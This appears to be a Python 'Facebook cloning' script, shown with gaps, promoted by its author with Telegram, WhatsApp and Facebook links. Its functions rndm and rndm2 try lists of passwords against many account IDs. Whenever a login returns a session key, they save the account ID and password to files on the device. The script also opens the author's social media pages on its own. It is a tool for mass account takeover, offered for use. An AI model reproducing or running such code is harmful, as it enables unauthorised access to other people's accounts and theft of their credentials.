...
#JOIN OUR TELEGRAM CHANNEL :  @https://t.me/DarkNightALONEer001
from os import path
...
print('\n\033[1;31m ⚡𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 ALONE ? 𝙷𝙰𝙲𝙺 𝙵𝙱 𝙲𝙻𝙾𝙽𝙴𝙸𝙽𝙶 𝚃𝙾𝙾𝙻𝚂 ⚡');time.sleep(3)


print('\n\033[1;32m亗𝙏𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙊𝙐𝙍 𝙏𝙊𝙊𝙇𝙎亗' );time.sleep(1)
os.system('xdg-open https://www.facebook.com/100040765325335/posts/981732709862231/?app=fbl /?app=fbl')
logo = """
\033[1;90m   
      \033[1;32m 
d8888b.    d8b   db   db   db  .d8b.   .o88b. db   dD 
88  `8D    888o  88   88   88 d8' `8b d8P  Y8 88 ,8P' 
88   88    88V8o 88   88ooo88 88ooo88 8P      88,8P   
88   88    88 V8o88   88~~~88 88~~~88 8b      88`8b   
88  .8D db 88  V888   88   88 88   88 Y8b  d8 88 `88. 
Y8888D' VP VP   V8P   YP   YP YP   YP  `Y88P' YP   YD \033[1;92m\033[1;90mA.\033[1;91mF.\033[1;92mG
\033[1;31m------------------------------------------------
\033[1;32m》AUTHOR    : ALONEـــــKING
》FACEBOOK  : ALONE BRO 
》GITHUB    : AFGHAN ALONE211
》WHATSAPP  : +93749594545
》TAEM      : AFG BROTHERS
\033[1;31m------------------------------------------------
"""
def linex():
...
def menu():
			clear()
			print('\033[1;33m------------------------------------------------')
			print('\033[1;96m[1] RANDOM CLONING V1\n\033[1;95m[2] RANDOM CLONING V2\n\033[1;93m[3] CONTACT BY MRr AFG ALONE \n\033[1;91m[E] EXIT')
			print('\033[1;33m------------------------------------------------')
			xd=input(' CHOOSE: ')
			os.system('xdg-open   https://www.facebook.com/profile.php?id=100040765325335')
			if xd in ['1','01']:
				awmafghan()
			if xd in ['02','2']:
				awmafghan1()
			if xd in ['03','3']:
				os.system('xdg-opopenhttps://www.facebook.com/profile.php?id=100040765325335')
				print('\033[1;37m')
				print('\033[1;33m------------------------------------------------')
...
def awmafghan():
		...
		os.system('xdg-open https://facebook.com/groups/221478176246619/')
		print('\033[1;33m------------------------------------------------')
		mthd = input(' CHOOSE: ')
		clear()
		print('\033[1;32m [1] \033[1;31mJOIN TELEGRAM CHANNEL')
		os.system('xdg-open  https://t.me/Dark_Night_ALONE')
		print('\033[1;33m------------------------------------------------')
		pcs = input(' [?] SELECT: ')
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AR ALONE-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AR ALONE-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AR ALONE-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/AR ALONE-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AR ALONE-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AR ALONE-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AR ALONE-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [AR.ALONE ALONE-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/AR ALONE-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AR.ALONE-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DN.ALONE-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
